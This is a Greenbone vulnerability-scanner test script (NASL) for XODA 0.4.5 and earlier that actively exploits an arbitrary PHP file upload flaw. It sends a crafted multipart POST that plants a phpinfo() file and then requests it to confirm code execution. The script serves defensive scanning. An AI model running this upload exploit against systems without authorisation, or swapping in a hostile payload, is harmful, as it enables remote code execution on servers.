# SPDX-FileCopyrightText: 2012 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103548");
  script_version("2025-08-21T05:40:06+0000");
  script_tag(name:"last_modification", value:"2025-08-21 05:40:06 +0000 (Thu, 21 Aug 2025)");
  script_tag(name:"creation_date", value:"2012-08-22 11:33:41 +0200 (Wed, 22 Aug 2012)");
  script_tag(name:"cvss_base", value:"9.7");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:P");

  script_cve_id("CVE-2012-10045");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_name("XODA <= 0.4.5 Multiple Vulnerabilities - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2012 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl",
                      "DDI_Directory_Scanner.nasl", "gb_php_http_detect.nasl",
                      "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"summary", value:"XODA is prone to an arbitrary file upload vulnerability and
  multiple HTML injection vulnerabilities because it fails to properly sanitize user-supplied
  input.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP POST request and checks the response.");

  script_tag(name:"impact", value:"An attacker could exploit these issues to execute arbitrary
  script code in a user's browser in the context of the affected site or execute arbitrary code on
  the server.");

  script_tag(name:"affected", value:"XODA version 0.4.5 and probably prior.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore. General
  solution options are to upgrade to a newer release, disable respective features, remove the
  product or replace the product by another one.");

  script_xref(name:"URL", value:"https://web.archive.org/web/20120824003438/http://www.securityfocus.com/bid/55127");
  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/20703");
  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/20713");
  script_xref(name:"URL", value:"https://sourceforge.net/projects/xoda/");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("list_array_func.inc");
include("misc_func.inc");
include("port_service_func.inc");

port = http_get_port( default:80 );
if( ! http_can_host_php( port:port ) )
  exit( 0 );

host = http_host_name( port:port );

foreach dir( make_list_unique( "/xoda", http_cgi_dirs( port:port ) ) ) {
  if( dir == "/" )
    dir = "";

  res = http_get_cache( port:port, item:dir + "/index.php" );
  if( ! res || res !~ "^HTTP/1\.[01] 200" )
    continue;

  url = dir + "/?upload_to=";
  if( http_vuln_check( port:port, url:url, pattern:"<h4>Upload a file" ) ) {
    useragent = http_get_user_agent();
    vtstrings = get_vt_strings();
    file = vtstrings["lowercase_rand"] + ".php";
    ex = "<?php phpinfo(); ?>";
    len = 361 + strlen(file);

    req = string("POST ", dir, "/?upload HTTP/1.1\r\n",
                 "Host: ", host, "\r\n",
                 "User-Agent: ", useragent, "\r\n",
                 "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n",
                 "Accept-Language: de-de,de;q=0.8,en-us;q=0.5,en;q=0.3\r\n",
                 "Connection: keep-alive\r\n",
                 "Referer: http://",host,"/xoda/?upload_to=\r\n",
                 "Content-Type: multipart/form-data; boundary=---------------------------161664008613401129571781664881\r\n",
                 "Content-Length: ",len,"\r\n",
                 "\r\n",
                 "-----------------------------161664008613401129571781664881\r\n",
                 'Content-Disposition: form-data; name="files_to_upload[]"; filename="',file,'"',"\r\n",
                 "Content-Type: application/x-php\r\n",
                 "\r\n",
                 "<?php phpinfo(); ?>\r\n",
                 "\r\n",
                 "-----------------------------161664008613401129571781664881\r\n",
                 'Content-Disposition: form-data; name="pwd"',"\r\n",
                 "\r\n",
                 "\r\n",
                 "-----------------------------161664008613401129571781664881--\r\n");
    res = http_keepalive_send_recv( data:req, port:port );

    if( "Location:" >< res ) {
      url = dir + "/files/" + file;
      req = http_get( item:url, port:port );
      buf = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );

      if( "<title>phpinfo()" >< buf ) {
        report = http_report_vuln_url( port:port, url:url );
        security_message( port:port, data:report );
        exit( 0 );
      }
    }
  }
}

exit( 99 );
